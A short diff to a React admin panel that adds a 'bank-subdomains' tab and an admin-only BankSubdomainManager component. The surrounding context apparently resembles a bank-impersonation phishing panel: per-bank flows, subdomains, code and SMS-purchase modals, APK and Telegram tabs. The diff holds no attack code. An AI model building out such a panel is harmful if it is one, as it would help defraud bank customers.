@@ -25,6 +25,7 @@ import WhatsAppBotPanel from '@/components/admin/WhatsAppBotPanel';
 import UserWhatsAppPanel from '@/components/user/UserWhatsAppPanel';
 import { LinkManagementPanel } from '@/components/admin/LinkManagementPanel';
 import BankFlowManager from '@/components/admin/BankFlowManager';
+import BankSubdomainManager from '@/components/admin/BankSubdomainManager';
 import UserFlowManager from '@/components/user/UserFlowManager';
 import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal } from '@/components/admin/Modals';
 import { FileManager } from '@/components/admin/FileManager';
@@ -42,7 +43,7 @@ export default function AdminPanel() {
   const { toast } = useToast();
   const { user, logoutMutation } = useAuth();
   const [activeBank, setActiveBank] = useState<string>("todos");
-  const [activeTab, setActiveTab] = useState<'current' | 'saved' | 'users' | 'registered' | 'executives' | 'sms' | 'qr' | 'telegram' | 'messages' | 'identity' | 'apk' | 'site-config' | 'system-config' | 'whatsapp' | 'links' | 'bank-flows' | 'flows'>('current');
+  const [activeTab, setActiveTab] = useState<'current' | 'saved' | 'users' | 'registered' | 'executives' | 'sms' | 'qr' | 'telegram' | 'messages' | 'identity' | 'apk' | 'site-config' | 'system-config' | 'whatsapp' | 'links' | 'bank-flows' | 'bank-subdomains' | 'flows'>('current');
   
   // Actualizar el banco activo cuando el usuario cambia
   useEffect(() => {
@@ -1067,6 +1068,8 @@ export default function AdminPanel() {
           <LinkManagementPanel />
         ) : activeTab === 'bank-flows' && user?.role === 'admin' ? (
           <BankFlowManager />
+        ) : activeTab === 'bank-subdomains' && user?.role === 'admin' ? (
+          <BankSubdomainManager />
         ) : activeTab === 'flows' ? (
           <UserFlowManager />
         ) : (
